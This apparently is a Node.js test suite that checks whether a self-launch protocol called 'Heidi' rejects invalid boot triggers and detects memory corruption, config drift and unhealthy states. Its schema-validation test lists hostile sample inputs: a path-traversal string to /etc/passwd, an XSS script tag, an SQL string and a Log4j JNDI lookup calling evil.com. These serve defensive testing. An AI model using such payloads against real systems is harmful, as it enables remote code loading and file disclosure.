#!/usr/bin/env node

/**
 * INTEGRITY-FIRST TEST SUITE
 * 
 * This doesn't test if Heidi can run.
 * It tests if Heidi correctly REFUSES to run when integrity is compromised.
 * 
 * Because the real test of a resilient system is not survival.
 * It's the courage to say "no" when conditions are unsafe.
 */

const HeidiSelfLaunchProtocol = require('./HeidiSelfLaunchProtocol');

class IntegrityFirstTestSuite {
  constructor() {
    this.protocol = new HeidiSelfLaunchProtocol();
    this.testResults = [];
  }

  async runTest(testName, testFunction) {
    console.log(`🧪 Running: ${testName}`);
    
    try {
      const result = await testFunction();
      if (result.passed) {
        console.log(`✅ ${testName} - PASSED`);
        console.log(`   ${result.message}`);
      } else {
        console.log(`❌ ${testName} - FAILED`);
        console.log(`   ${result.message}`);
      }
      this.testResults.push({ name: testName, ...result });
    } catch (error) {
      console.log(`💥 ${testName} - ERROR: ${error.message}`);
      this.testResults.push({ name: testName, passed: false, message: error.message });
    }
    
    console.log('');
  }

  /**
   * Test 1: Hard Rejection Rules - Type Enforcement
   */
  async testHardRejectionTypeEnforcement() {
    const invalidTypes = [
      null,
      undefined,
      123,
      { trigger: 'manual' },
      ['manual'],
      () => 'manual'
    ];
    
    let allRejected = true;
    
    for (const invalidTrigger of invalidTypes) {
      const protocol = new HeidiSelfLaunchProtocol();
      const result = await protocol.checkBootTrigger(invalidTrigger);
      
      if (result) {
        allRejected = false;
        console.log(`❌ Type enforcement failed - accepted: ${JSON.stringify(invalidTrigger)}`);
        break;
      }
    }
    
    return {
      passed: allRejected,
      message: allRejected ? 
        'All invalid types correctly rejected' : 
        'Some invalid types were incorrectly accepted'
    };
  }

  /**
   * Test 2: Hard Rejection Rules - Schema Validation
   */
  async testHardRejectionSchemaValidation() {
    const invalidTriggers = [
      '',
      'invalid',
      'INVALID',
      'Manual', // Case sensitive
      ' MANUAL ', // Whitespace
      'manual\n', // Newline
      'manual\r', // Carriage return
      'a'.repeat(51), // Too long
      '../../etc/passwd', // Path injection attempt
      '<script>alert("xss")</script>', // XSS attempt
      'SELECT * FROM users', // SQL injection attempt
      '${jndi:ldap://evil.com/a}', // Log4j attempt
    ];
    
    let allRejected = true;
    
    for (const invalidTrigger of invalidTriggers) {
      const protocol = new HeidiSelfLaunchProtocol();
      const result = await protocol.checkBootTrigger(invalidTrigger);
      
      if (result) {
        allRejected = false;
        console.log(`❌ Schema validation failed - accepted: "${invalidTrigger}"`);
        break;
      }
    }
    
    return {
      passed: allRejected,
      message: allRejected ? 
        'All invalid schemas correctly rejected' : 
        'Some invalid schemas were incorrectly accepted'
    };
  }

  /**
   * Test 3: Observable Corruption Detection
   */
  async testObservableCorruptionDetection() {
    const protocol = new HeidiSelfLaunchProtocol();
    
    // Set up corrupted memory snapshots
    protocol.state.memory_snapshots = {
      'good_snapshot': {
        timestamp: '2026-04-29T23:30:00.000Z',
        data: 'clean data',
        checksum: '0xVALID123'
      },
      'corrupted_timestamp': {
        timestamp: 'INVALID_TIMESTAMP',
        data: 'clean data',
        checksum: '0xVALID123'
      },
      'corrupted_checksum': {
        timestamp: '2026-04-29T23:30:00.000Z',
        data: 'clean data',
        checksum: '0xDEADBEEF'
      },
      'corrupted_data': {
        timestamp: '2026-04-29T23:30:00.000Z',
        data: 'CORRUPTED_data_content',
        checksum: '0xVALID123'
      }
    };
    
    const result = await protocol.validateMemoryContradictions();
    
    return {
      passed: !result, // Should return false (corruption detected)
      message: !result ? 
        'Corruption correctly detected and flagged' : 
        'Corruption was NOT detected - SYSTEM FAILURE'
    };
  }

  /**
   * Test 4: Config Drift Detection
   */
  async testConfigDriftDetection() {
    const protocol = new HeidiSelfLaunchProtocol();
    
    // Corrupt configuration values
    protocol.config = {
      DRIFT_THRESHOLD: 1.5, // Significant drift from 0.7
      CONFIDENCE_THRESHOLD: 'invalid', // Type mismatch
      HEARTBEAT_INTERVAL: 60000, // This one is correct
      BOOT_TIMEOUT: undefined, // Missing value
      MAX_RETRY_ATTEMPTS: 10, // Significant drift from 3
      SAFE_MODE_RATE_LIMIT: 5 // This one is correct
    };
    
    const result = await protocol.validateConfigDrift();
    
    return {
      passed: !result, // Should return false (drift detected)
      message: !result ? 
        'Config drift correctly detected and flagged' : 
        'Config drift was NOT detected - SYSTEM FAILURE'
    };
  }

  /**
   * Test 5: Running ≠ Healthy Separation
   */
  async testRunningVsHealthySeparation() {
    const protocol = new HeidiSelfLaunchProtocol();
    
    // Set up a system that is "running" but not "healthy"
    protocol.state.HEIDI_STATUS = 'ACTIVE';
    protocol.state.MODE = 'SAFE_MODE'; // Contradiction
    protocol.state.HEARTBEAT = 'ENABLED';
    protocol.state.boot_phase = 8;
    protocol.state.drift_score = 0.8; // Above threshold
    protocol.state.error_log = [
      { reason: 'memory_corruption_detected', time: new Date().toISOString() }
    ];
    
    // Corrupt config to trigger integrity failure
    protocol.config = { DRIFT_THRESHOLD: 2.0 };
    
    const healthStatus = await protocol.getHealthStatus();
    
    return {
      passed: healthStatus.is_running && !healthStatus.is_healthy,
      message: healthStatus.is_running && !healthStatus.is_healthy ? 
        `Correctly identified as RUNNING but NOT HEALTHY (state: ${healthStatus.system_state})` : 
        `Failed to distinguish running from healthy (running: ${healthStatus.is_running}, healthy: ${healthStatus.is_healthy})`
    };
  }

  /**
   * Test 6: Containment Mode Activation
   */
  async testContainmentModeActivation() {
    const protocol = new HeidiSelfLaunchProtocol();
    
    // Trigger critical corruption
    protocol.state.memory_snapshots = {
      'critical_corruption': {
        timestamp: '2026-04-29T23:30:00.000Z',
        data: 'CORRUPTED_critical_data',
        checksum: '0xDEADBEEF'
      }
    };
    
    // Try to run integrity validation
    const memoryValid = await protocol.validateMemoryContradictions();
    const configValid = await protocol.validateConfigDrift();
    
    // Check if system properly enters degraded/critical state
    const healthStatus = await protocol.getHealthStatus();
    
    return {
      passed: !memoryValid && (healthStatus.system_state === 'DEGRADED' || healthStatus.system_state === 'CRITICAL'),
      message: !memoryValid && (healthStatus.system_state === 'DEGRADED' || healthStatus.system_state === 'CRITICAL') ? 
        `System correctly entered ${healthStatus.system_state} state due to corruption` : 
        'System failed to enter containment mode despite corruption'
    };
  }

  /**
   * Test 7: Error Logging for Rejections
   */
  async testErrorLoggingForRejections() {
    const protocol = new HeidiSelfLaunchProtocol();
    
    // Trigger various rejection types
    await protocol.checkBootTrigger(null); // Type error
    await protocol.checkBootTrigger('invalid_trigger'); // Schema error
    await protocol.checkBootTrigger('a'.repeat(100)); // Length error
    
    // Check if errors were properly logged
    const errorLog = protocol.state.error_log;
    const hasTypeError = errorLog.some(e => e.reason === 'boot_trigger_type_violation');
    const hasSchemaError = errorLog.some(e => e.reason === 'boot_trigger_schema_violation');
    const hasLengthError = errorLog.some(e => e.reason === 'boot_trigger_length_violation');
    
    return {
      passed: hasTypeError && hasSchemaError && hasLengthError,
      message: (hasTypeError && hasSchemaError && hasLengthError) ? 
        'All rejection types properly logged' : 
        `Missing error logs - Type: ${hasTypeError}, Schema: ${hasSchemaError}, Length: ${hasLengthError}`
    };
  }

  /**
   * Test 8: Integrity Score Calculation
   */
  async testIntegrityScoreCalculation() {
    const protocol = new HeidiSelfLaunchProtocol();
    
    // Set up a system with partial integrity failures
    protocol.state.HEIDI_STATUS = 'ACTIVE';
    protocol.state.MODE = 'OPERATIONAL';
    protocol.state.HEARTBEAT = 'ENABLED';
    protocol.state.boot_phase = 8;
    protocol.state.drift_score = 0.5; // Below threshold
    protocol.state.error_log = []; // No critical errors
    
    // One config issue to reduce integrity score
    protocol.config = { 
      DRIFT_THRESHOLD: 0.9, // Slight drift
      CONFIDENCE_THRESHOLD: 0.7,
      HEARTBEAT_INTERVAL: 60000,
      BOOT_TIMEOUT: 30000,
      MAX_RETRY_ATTEMPTS: 3,
      SAFE_MODE_RATE_LIMIT: 5
    };
    
    const healthStatus = await protocol.getHealthStatus();
    
    return {
      passed: healthStatus.integrity_score < 1.0 && healthStatus.integrity_score > 0.8,
      message: healthStatus.integrity_score < 1.0 && healthStatus.integrity_score > 0.8 ? 
        `Integrity score correctly calculated: ${healthStatus.integrity_score.toFixed(2)}` : 
        `Integrity score calculation incorrect: ${healthStatus.integrity_score}`
    };
  }

  async runAllTests() {
    console.log('🛡️  INTEGRITY-FIRST TEST SUITE');
    console.log('============================');
    console.log('Testing Heidi\'s courage to say "no" when unsafe...\n');

    const tests = [
      { name: 'Hard Rejection - Type Enforcement', test: () => this.testHardRejectionTypeEnforcement() },
      { name: 'Hard Rejection - Schema Validation', test: () => this.testHardRejectionSchemaValidation() },
      { name: 'Observable Corruption Detection', test: () => this.testObservableCorruptionDetection() },
      { name: 'Config Drift Detection', test: () => this.testConfigDriftDetection() },
      { name: 'Running ≠ Healthy Separation', test: () => this.testRunningVsHealthySeparation() },
      { name: 'Containment Mode Activation', test: () => this.testContainmentModeActivation() },
      { name: 'Error Logging for Rejections', test: () => this.testErrorLoggingForRejections() },
      { name: 'Integrity Score Calculation', test: () => this.testIntegrityScoreCalculation() }
    ];

    for (const { name, test } of tests) {
      await this.runTest(name, test);
    }

    this.printFinalReport();
  }

  printFinalReport() {
    const passed = this.testResults.filter(t => t.passed).length;
    const total = this.testResults.length;
    const integrityRate = (passed / total) * 100;

    console.log('📊 INTEGRITY-FIRST TEST RESULTS');
    console.log('===============================');
    console.log(`Passed: ${passed}/${total}`);
    console.log(`Integrity Rate: ${integrityRate.toFixed(1)}%\n`);

    console.log('📋 DETAILED RESULTS:');
    this.testResults.forEach(test => {
      const icon = test.passed ? '✅' : '❌';
      console.log(`${icon} ${test.name}`);
      console.log(`   ${test.message}`);
    });

    console.log('\n🎯 INTEGRITY ASSESSMENT:');
    
    if (integrityRate === 100) {
      console.log('🎉 PERFECT INTEGRITY - Heidi correctly rejects all unsafe conditions');
      console.log('   This system can be trusted to protect itself from corruption');
    } else if (integrityRate >= 80) {
      console.log('⚠️  STRONG INTEGRITY with minor gaps');
      console.log('   System is mostly trustworthy but needs some refinements');
    } else if (integrityRate >= 60) {
      console.log('🔶 MODERATE INTEGRITY - significant vulnerabilities exist');
      console.log('   System requires major improvements before production use');
    } else {
      console.log('❌ POOR INTEGRITY - system cannot be trusted');
      console.log('   Major architectural failures in safety mechanisms');
    }

    console.log('\n🧠 THE REAL TEST:');
    console.log('A system that survives chaos is impressive.');
    console.log('A system that refuses to run when compromised is trustworthy.');
    console.log('');
    console.log('You now have the latter.');
  }
}

// Run integrity tests if this file is executed directly
if (require.main === module) {
  const testSuite = new IntegrityFirstTestSuite();
  testSuite.runAllTests().catch(error => {
    console.error('💥 Integrity test suite failed:', error);
    process.exit(1);
  });
}

module.exports = IntegrityFirstTestSuite;
